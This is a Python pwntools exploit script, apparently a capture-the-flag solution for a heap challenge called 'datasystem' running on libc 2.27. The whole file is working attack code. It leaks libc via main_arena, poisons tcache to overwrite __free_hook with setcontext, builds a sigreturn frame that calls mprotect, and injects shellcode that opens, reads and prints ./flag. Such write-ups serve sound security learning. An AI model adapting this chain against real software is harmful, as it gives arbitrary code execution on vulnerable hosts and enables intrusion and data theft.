from pwn import *

context.log_level='debug'
context.terminal= ['tmux','splitw','-h']
context(arch = 'amd64' , os = 'linux')
#p = remote('node4.buuoj.cn','28053')
p = process('./datasystem')
libc = ELF('./libc-2.27-data.so')


def login():
    p.sendafter("please input username: ", "admin\x00")
    p.sendafter("please input password: ", "c"*32)

def add(size, data="a\n"):
    p.sendlineafter(">> :\n", "1")
    p.sendlineafter("Size: \n", str(size))
    p.sendafter("what's your Content: \n", data)


def delete(idx):
    p.sendlineafter(">> :\n", "2")
    p.sendlineafter("Index:\n", str(idx))

def show(idx):
    p.sendlineafter(">> :\n", "3")
    p.sendlineafter("Index:\n", str(idx))

def edit(idx, data):
    p.sendlineafter(">> :\n", "4")
    p.sendlineafter("Index:\n", str(idx))
    p.recvuntil('Content:\n')
    p.send(data)

login()

#----------------------------------
attach(p,'b *$rebase(0x0000000000002EFA)')
add(0x20)#0
add(0x500)#1
add(0x100)#2
add(0x20)#3

delete(1)
delete(0)

payload = 'a'*0x20+'junkjunk'+'kkkkkkkk'
add(0x20,payload)

show(0)
# main_arena+96
main_arena_96 = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
main_arena = main_arena_96 - 96
print "main_arena=>[+]"+hex(main_arena)

libc_base = main_arena - 0x3EBC40
print "libc_base=>[+]"+hex(libc_base)
#pause()

delete(0)
payload = 'a'*0x20 + p64(0) + p64(0x510)
add(0x20,payload) #0
#pause()

add(0x10,'b')#1
delete(0)
delete(1)
payload = 'a'*0x20 + p64(0) + p64(0x20) + p64(libc_base+libc.sym['__free_hook'])
add(0x20,payload) #0
free_hook = libc_base+libc.sym['__free_hook']

add(0x10,p64(free_hook))#1

setcontext = libc_base+libc.sym['setcontext']+53

new_addr = free_hook & 0xfffffffffffff000
#----------------------------------frame
frame = SigreturnFrame()
frame.rsp = free_hook+0x10
frame.rdi = new_addr
frame.rsi = 0x1000
frame.rdx = 7
frame.rip = libc_base + libc.sym['mprotect']
#----------------------------------shellcode
shellcode1 = '''xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi
'''%new_addr
#----------------------------------
payload = p64(setcontext) + p64(free_hook+0x18)*2 + asm(shellcode1)
#----------------------------------
orw = '''
mov rax, 0x67616c662f2e ;// ./flag
push rax

mov rdi, rsp ;// ./flag
mov rsi, 0 ;// O_RDONLY
xor rdx, rdx ;
mov rax, 2 ;// SYS_open
syscall

mov rdi, rax ;// fd 
mov rsi,rsp  ;
mov rdx, 1024 ;// nbytes
mov rax,0 ;// SYS_read
syscall

mov rdi, 1 ;// fd 
mov rsi, rsp ;// buf
mov rdx, rax ;// count 
mov rax, 1 ;// SYS_write
syscall

mov rdi, 0 ;// error_code
mov rax, 60
syscall
'''

add(0x10,payload) #4
edit(2,str(frame))

pause()
delete(2)

p.sendline(asm(orw))



#----------------------------------
p.interactive()